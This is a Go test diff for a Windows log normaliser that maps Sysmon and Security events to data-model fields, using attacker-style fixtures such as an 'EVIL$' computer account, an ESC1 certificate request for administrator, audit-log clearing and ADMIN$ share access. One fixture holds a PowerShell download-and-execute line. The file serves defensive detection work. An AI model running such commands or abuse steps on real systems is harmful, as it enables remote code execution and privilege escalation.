@@ -465,6 +465,12 @@ func TestSysmonEventTypes(t *testing.T) {
 	expect(t, sysmon(12, "Registry object added or deleted:", "EventType: CreateKey", `TargetObject: HKLM\System\CurrentControlSet\Services\Evil`), map[string]any{
 		"datamodel": "Registry", "action": "created", "registry_key_name": "Evil",
 	})
+	expect(t, sysmon(5, "Process terminated:", `Image: C:\Windows\System32\vssadmin.exe`, "ProcessId: 4242", `User: CORP\bob`), map[string]any{
+		"datamodel": "Endpoint", "action": "stopped", "signature_id": "5", "process_name": "vssadmin.exe", "process_id": int64(4242),
+	})
+	expect(t, sysmon(9, "RawAccessRead detected:", `Image: C:\Tools\dd.exe`, `Device: \Device\Harddisk0\DR0`), map[string]any{
+		"datamodel": "Endpoint", "signature": "RawAccessRead detected", "device": `\Device\Harddisk0\DR0`, "process_name": "dd.exe",
+	})
 	expect(t, sysmon(15, "File stream created:", `Image: C:\Program Files\Mozilla Firefox\firefox.exe`,
 		`TargetFilename: C:\Users\bob\Downloads\setup.exe:Zone.Identifier`, "Hash: SHA256=ABCD,IMPHASH=00",
 		`Contents: [ZoneTransfer]  ZoneId=3`), map[string]any{
@@ -486,5 +492,62 @@ func TestSysmonEventTypes(t *testing.T) {
 	expect(t, Normalize("win.powershell", decode(t, string(b)), now).Document(), map[string]any{
 		"datamodel": "Script", "script_block_text": "IEX (New-Object Net.WebClient).DownloadString('http://x')",
 		"script_block_id": "5d1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10", "script_part": int64(2), "script_parts": int64(3),
+	})
+}
+
+func TestWindowsSecurityNamedEvents(t *testing.T) {
+	security := func(id string, data map[string]string) map[string]any {
+		return Normalize("win.events", WinEventRecord("Security", id, "DC1", now, data), now).Document()
+	}
+	subject := func(m map[string]string) map[string]string {
+		m["SubjectUserSid"], m["SubjectUserName"], m["SubjectDomainName"], m["SubjectLogonId"] = "S-1-5-21-1-1104", "eve", "CORP", "0x1a2b"
+		return m
+	}
+	expect(t, security("4776", map[string]string{"PackageName": "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0", "TargetUserName": "bob",
+		"Workstation": "RULER", "Status": "0xc0000064"}), map[string]any{
+		"datamodel": "Authentication", "action": "failure", "user": "bob", "src_host": "RULER", "ntlm_status": "0xc0000064",
+		"authentication_method": "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0",
+	})
+	expect(t, security("4771", map[string]string{"TargetUserName": "bob", "TargetSid": "S-1-5-21-1-1105", "ServiceName": "krbtgt/CORP",
+		"TicketOptions": "0x40810010", "Status": "0x18", "PreAuthType": "2", "IpAddress": "::ffff:192.0.2.10", "IpPort": "50123"}), map[string]any{
+		"datamodel": "Authentication", "action": "failure", "user": "bob", "kerberos_status": "0x18", "src": "192.0.2.10", "src_port": int64(50123),
+	})
+	expect(t, security("4741", subject(map[string]string{"TargetUserName": "EVIL$", "TargetDomainName": "CORP", "TargetSid": "S-1-5-21-1-3001",
+		"SamAccountName": "EVIL$", "NewUacValue": "0x80", "UserAccountControl": "\r\n\t\t%%2087", "DnsHostName": "evil.corp.example.com",
+		"ServicePrincipalNames": "HOST/evil.corp.example.com\r\n\t\tRestrictedKrbHost/EVIL"})), map[string]any{
+		"datamodel": "Change", "action": "created", "object_category": "computer", "object": "EVIL$", "user": "eve", "user_sid": "S-1-5-21-1-1104",
+		"new_uac_value": "0x80", "user_account_control": "%%2087", "dns_host_name": "evil.corp.example.com",
+		"service_principal_names": "HOST/evil.corp.example.com RestrictedKrbHost/EVIL",
+	})
+	expect(t, security("4742", subject(map[string]string{"ComputerAccountChange": "-", "TargetUserName": "WS2$",
+		"ServicePrincipalNames": "GC/dc2.corp.example.com/corp.example.com"})), map[string]any{
+		"action": "modified", "object": "WS2$", "service_principal_names": "GC/dc2.corp.example.com/corp.example.com",
+	})
+	expect(t, security("4781", subject(map[string]string{"OldTargetUserName": "Administrator", "NewTargetUserName": "admin2",
+		"TargetDomainName": "CORP", "TargetSid": "S-1-5-21-1-500"})), map[string]any{
+		"datamodel": "Change", "object": "admin2", "old_object": "Administrator", "object_sid": "S-1-5-21-1-500", "user": "eve",
+	})
+	expect(t, security("4727", subject(map[string]string{"TargetUserName": "ESX Admins", "TargetDomainName": "CORP", "SamAccountName": "ESX Admins"})),
+		map[string]any{"action": "created", "object_category": "group", "object": "ESX Admins", "sam_account_name": "ESX Admins"})
+	expect(t, security("4730", subject(map[string]string{"TargetUserName": "Old Group"})), map[string]any{"action": "deleted", "object": "Old Group"})
+	expect(t, security("4729", subject(map[string]string{"MemberSid": "S-1-5-21-1-1105", "TargetUserName": "Domain Admins"})),
+		map[string]any{"action": "modified", "member_sid": "S-1-5-21-1-1105", "object": "Domain Admins"})
+	expect(t, security("4798", subject(map[string]string{"TargetUserName": "bob", "CallerProcessId": "0x1a4",
+		"CallerProcessName": `C:\Users\eve\AppData\Roaming\Telegram Desktop\Telegram.exe`})), map[string]any{
+		"action": "read", "object": "bob", "process_name": "Telegram.exe", "process_id": int64(420),
+	})
+	expect(t, security("4887", map[string]string{"RequestId": "57", "Requester": `CORP\eve`,
+		"Attributes": "CertificateTemplate:ESC1\nSAN:upn=administrator@corp.example.com", "Disposition": "3", "Subject": "CN=eve"}), map[string]any{
+		"action": "created", "object_category": "certificate", "cert_request_id": "57", "cert_requester": `CORP\eve`,
+		"cert_attributes": "CertificateTemplate:ESC1\nSAN:upn=administrator@corp.example.com", "cert_subject": "CN=eve",
+	})
+	expect(t, security("1102", subject(map[string]string{})), map[string]any{"action": "deleted", "object_category": "audit_log", "user": "eve"})
+	expect(t, security("4702", subject(map[string]string{"TaskName": `\Updater`,
+		"TaskContentNew": `<Task><Actions><Exec><Command>cmd.exe</Command><Arguments>/c whoami</Arguments></Exec></Actions></Task>`})), map[string]any{
+		"action": "modified", "task_name": `\Updater`, "task_command": "cmd.exe", "task_arguments": "/c whoami",
+	})
+	expect(t, security("5140", subject(map[string]string{"ObjectType": "File", "IpAddress": "192.0.2.10", "IpPort": "50123",
+		"ShareName": `\\*\ADMIN$`, "ShareLocalPath": `\??\C:\Windows`, "AccessMask": "0x1", "AccessList": "%%4416"})), map[string]any{
+		"datamodel": "Filesystem", "share_name": `\\*\ADMIN$`, "share_path": `\??\C:\Windows`, "src": "192.0.2.10", "user": "eve",
 	})
 }
